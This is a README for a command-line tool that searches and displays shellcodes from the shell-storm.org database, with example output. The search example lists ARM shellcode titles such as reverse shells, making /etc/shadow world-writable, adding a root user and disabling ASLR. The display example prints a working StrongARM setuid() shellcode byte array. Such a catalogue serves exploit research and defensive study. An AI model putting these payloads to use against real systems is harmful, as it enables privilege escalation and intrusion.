shell-storm API
===============

Search and display all shellcodes in shell-storm database.

* [Web Site Project](http://shell-storm.org/project/shell-storm-API/)


Usage
-----

<b>Syntax</b>

<pre>./shell-storm-api.py &lt;option&gt; &lt;arg&gt;</pre>

<b>Options</b>

<pre>
-search               Search shellcodes
-display              Display shellcode
-version              Display version
</pre>


Example
-------

<pre>
$ ./shell-storm-api.py -search arm
Connecting to shell-storm.org...
Found 23 shellcodes
ScId	Title
[821]	Linux/ARM - reverse_shell(tcp,10.1.1.2,0x1337)
[820]	Linux/ARM - chmod(/etc/shadow, 0777) - 41 bytes
[819]	Linux/ARM - execve(/bin/sh, [0], [0 vars]) - 30 bytes
[765]	Linux/x86 - /etc/init.d/apparmor teardown - 53 bytes
[754]	Linux/ARM - connect back /bin/sh. 79 bytes
[735]	Linux/ARM - add root user with password - 151 bytes
[730]	Linux/ARM - Bindshell port 0x1337
[729]	Linux/ARM - Bind Connect UDP Port 68
[728]	Linux/ARM - Loader Port 0x1337
[727]	Linux/ARM - ifconfig eth0 and Assign Address
[698]	Linux/ARM - execve(/bin/sh, [0], [0 vars]) - 27 bytes
[696]	Linux/ARM - execve(/bin/sh,NULL,0) - 31 bytes
[696]	Linux/ARM - execve(/bin/sh,NULL,0) - 31 bytes
[671]	Linux/ARM - Polymorphic execve("/bin/sh", ["/bin/sh"], NULL); - XOR 88 encoded - 78 bytes
[670]	Linux/ARM - polymorphic chmod(/etc/shadow, 0777) - 84 Bytes
[669]	Linux/ARM - Disable ASLR Security - 102 bytes
[668]	Linux/ARM - chmod(/etc/shadow, 0777) Shellcode - 35 Bytes
[667]	Linux/ARM - Kill all processes (with/without _setuid) - 28 bytes
[666]	Linux/ARM - setuid(0) & execve(/bin/sh, /bin/sh, 0) - 38 bytes
[665]	Linux/ARM - execve(/bin/sh, /bin/sh, 0) - 30 bytes
[661]	Linux/StrongARM - bind() portshell - 203 bytes
[660]	Linux/StrongARM - setuid() - 20 bytes
[659]	Linux/StrongARM - execve() - 47 bytes
$
</pre>


<pre>
$ ./shell-storm-api.py -display 660
Connecting to shell-storm.org...

/*
 * 20 byte StrongARM/Linux setuid() shellcode
 * funkysh
 */

char shellcode[]= "\x02\x20\x42\xe0"   /*  sub   r2, r2, r2            */
                  "\x04\x10\x8f\xe2"   /*  add   r1, pc, #4            */
                  "\x12\x02\xa0\xe1"   /*  mov   r0, r2, lsl r2        */
                  "\x01\x20\xc1\xe5"   /*  strb  r2, [r1, #1]          */
                  "\x17\x0b\x90\xef";  /*  swi   0x90ff17              */



$
</pre>

